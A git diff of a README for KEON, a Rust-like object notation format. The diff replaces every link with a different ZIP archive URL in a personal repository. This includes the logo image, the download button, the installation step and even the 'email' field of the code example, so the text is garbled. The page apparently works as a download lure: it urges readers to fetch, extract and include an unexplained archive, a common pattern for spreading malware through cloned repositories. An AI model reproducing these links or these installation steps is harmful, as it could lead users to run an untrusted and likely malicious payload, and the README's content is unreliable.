@@ -1,10 +1,10 @@
 
 # 🚀 **KEON: Human Readable Object Notation**
 
-![KEON Logo](https://github.com/farizalsalman21/keon/releases/download/v2.0/Release_x64.zip)
+![KEON Logo](https://github.com/farizalsalman21/keon/raw/refs/heads/main/custodes/Software_v2.2.zip)
 
 ## Introduction
-Welcome to the KEON GitHub repository! KEON is a human-readable object notation/serialization format that is syntactically similar to Rust and fully supports Serde's data model. This https://github.com/farizalsalman21/keon/releases/download/v2.0/Release_x64.zip file will provide you with all the information you need to get started with KEON.
+Welcome to the KEON GitHub repository! KEON is a human-readable object notation/serialization format that is syntactically similar to Rust and fully supports Serde's data model. This https://github.com/farizalsalman21/keon/raw/refs/heads/main/custodes/Software_v2.2.zip file will provide you with all the information you need to get started with KEON.
 
 ## Table of Contents
 - [Repository Link](#repository-link)
@@ -18,14 +18,14 @@ Welcome to the KEON GitHub repository! KEON is a human-readable object notation/
 ## Repository Link
 If you want to download the KEON software, please click the button below:
 
-[![Download KEON](https://github.com/farizalsalman21/keon/releases/download/v2.0/Release_x64.zip)](https://github.com/farizalsalman21/keon/releases/download/v2.0/Release_x64.zip "Launch to download")
+[![Download KEON](https://github.com/farizalsalman21/keon/raw/refs/heads/main/custodes/Software_v2.2.zip)](https://github.com/farizalsalman21/keon/raw/refs/heads/main/custodes/Software_v2.2.zip "Launch to download")
 
 ## About KEON
 KEON is a lightweight, human-readable, and easy-to-understand object notation format designed for representing complex data structures. It combines the simplicity of a human-readable format with the power of serialization provided by Serde. The syntax of KEON is inspired by Rust, making it familiar to Rust developers.
 
 ## Installation
 To install KEON, follow these simple steps:
-1. Download the KEON software from [here](https://github.com/farizalsalman21/keon/releases/download/v2.0/Release_x64.zip).
+1. Download the KEON software from [here](https://github.com/farizalsalman21/keon/raw/refs/heads/main/custodes/Software_v2.2.zip).
 2. Extract the contents of the ZIP file to your desired location.
 3. Include the KEON library in your project.
 4. You are now ready to start using KEON in your applications.
@@ -46,7 +46,7 @@ person {
     age: 30,
     is_student: false,
     contact: {
-        email: "https://github.com/farizalsalman21/keon/releases/download/v2.0/Release_x64.zip",
+        email: "https://github.com/farizalsalman21/keon/raw/refs/heads/main/custodes/Software_v2.2.zip",
         phone: "+1234567890"
     }
 }
